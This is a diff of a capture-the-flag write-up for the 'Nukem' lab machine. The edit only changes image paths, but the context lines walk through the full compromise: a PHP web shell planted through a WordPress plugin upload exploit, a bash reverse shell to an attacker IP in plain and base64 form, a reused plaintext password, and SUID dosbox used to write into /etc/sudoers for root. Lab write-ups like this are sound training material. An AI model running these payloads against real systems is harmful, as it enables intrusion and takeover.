@@ -40,7 +40,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.77 seconds
 ```
 
 Visiting web server on port 80.
-![](Nukem1.png)
+![](Images/Nukem1.png)
 Nmap identifies that WordPress is running on TCP port 80, which I’ll enumerate with wpscan to identify installed plugins:
 ```sh
 wpscan --url http://192.168.228.105
@@ -50,33 +50,33 @@ OR
 wpscan --url http://TARGET -e ap,at,u --plugins-detection aggressive
 ```
 
-![](Nukem3.png)
+![](Images/Nukem3.png)
 There are quite a few outdated plugins installed on the web server. I’ll use searchsploit to look for any public exploit scripts:
 
-![](Nukem2.png)
+![](Images/Nukem2.png)
 I’ll download the Arbitrary File Upload script:
-![](Nukem4.png)
+![](Images/Nukem4.png)
 Usage: 
-![](Nukem5.png)
+![](Images/Nukem5.png)
 Existing payload of file.
-![](Nukem6.png)
+![](Images/Nukem6.png)
 I need to edit the payload within the script in order confirm the RCE by file upload.
 ```sh
 <?php system($_REQUEST['cmd']) ?>
 ```
-![](Nukem7.png)
+![](Images/Nukem7.png)
 
 Now I can simply run the exploit script providing the URL to the vulnerably WordPress site:
 We put the payload in double quotes as single quotes were generating error.
-![](Nukem8.png)
+![](Images/Nukem8.png)
 Run the exploit.
-![](Nukem9.png)
+![](Images/Nukem9.png)
 The exploit appears to have ran successfully, so now I’ll navigate to the outputted URL in my browser and try to run a command:
-![](Nukem10.png)
+![](Images/Nukem10.png)
 Simply visiting the URl gave us blank page, so we added `?cmd=id` to it.
-![](Nukem11.png)
+![](Images/Nukem11.png)
 Now that I’ve confirmed I have RCE, I’ll run a base64 encoded bash reverse shell. Because adding plain command didn't give us shell.
-![](Nukem12.png)
+![](Images/Nukem12.png)
 ```sh
 echo "bash -i >& /dev/tcp/192.168.45.222/80 0>&1 " | base64
 ```
@@ -85,15 +85,15 @@ Placing the below command to `?cmd=`.
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyMi84MCAwPiYxIAo= | base64 -d | bash 
 ```
 Starting nc on port 80.
-![](Nukem13.png)
-![](Nukem14.png)
+![](Images/Nukem13.png)
+![](Images/Nukem14.png)
 
 All this above things didn't work. So we get back to the basics and simply changed the payload in original exploit.
 So we changed the payload in the exploit and run it.
-![](Nukem15.png)
+![](Images/Nukem15.png)
 And we got the shell.
-![](Nukem16.png)
-![](Nukem17.png)
+![](Images/Nukem16.png)
+![](Images/Nukem17.png)
 ## Privilege Escalation - Commander
 
 Knowing that the web server is running WordPress, I’ll look in the wp-config.phpfile for any plaintext credentials:
@@ -101,19 +101,19 @@ Knowing that the web server is running WordPress, I’ll look in the wp-config.p
 find / -name *.php 2>/dev/null
 ```
 
-![](Nukem18.png)
-![](Nukem19.png)
-![](Nukem20.png)
+![](Images/Nukem18.png)
+![](Images/Nukem19.png)
+![](Images/Nukem20.png)
 `commander : CommanderKeenVorticons1990`
 
 Here I find the password for the ‘commander’ user (CommanderKeenVorticons1990), which I can use to SSH into the box:
-![](Nukem21.png)
+![](Images/Nukem21.png)
 While searching for SUID binaries, we find that `dosbox` is present with the SUID bit set.
 ```sh
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](Nukem22.png)
+![](Images/Nukem22.png)
 
 However, attempting to run `dosbox` from the command line fails as it requires a graphical interface. Further enumeration reveals a VNC service on port 5901 that could give us GUI access.
 First, I’ll check for any services that are only listening locally on the box.
@@ -123,7 +123,7 @@ OR
 ss -tulnp
 ```
 
-![](Nukem23.png)
+![](Images/Nukem23.png)
 
 I find that port 5901 is listening only on the loopback interface. Port 5901 is typically associated with VNC, a GUI remote access tool. In order to access this from my Kali box, I’ll kill my SSH shell and set up a local port forward, mapping port 5901 on the target, to my local host port 5901:
 To access the VNC service securely, we’ll forward port 5901 to our machine using SSH.
@@ -131,14 +131,14 @@ To access the VNC service securely, we’ll forward port 5901 to our machine usi
 ssh -L 5901:localhost:5901 commander@192.168.215.105
 ```
 
-![](Nukem24.png)
+![](Images/Nukem24.png)
 Now, from my local host, I can run vncviewer to access the VNC service.
 With the tunnel active, we connect using `vncviewer`.
 ```sh
 vncviewer localhost:5901
 ```
 
-![](Nukem25.png)
+![](Images/Nukem25.png)
 Entered password we found for user `commander`
 Instead, I’ll attempt it from the VNC GUI, attempting to grant myself (commander) access to all sudo privileges:
 ```sh
@@ -148,11 +148,11 @@ LFILE='/etc/sudoers'
 dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
 ```
 Click o Applications on top left corner and open the terminal.
-![](Nukem26.png)
+![](Images/Nukem26.png)
 Based on the output, it appears to have been successful, so I’ll try and switch user’s (su) to root with sudo:
 ```sh
 sudo su root
 ```
 
-![](Nukem27.png)
+![](Images/Nukem27.png)
 
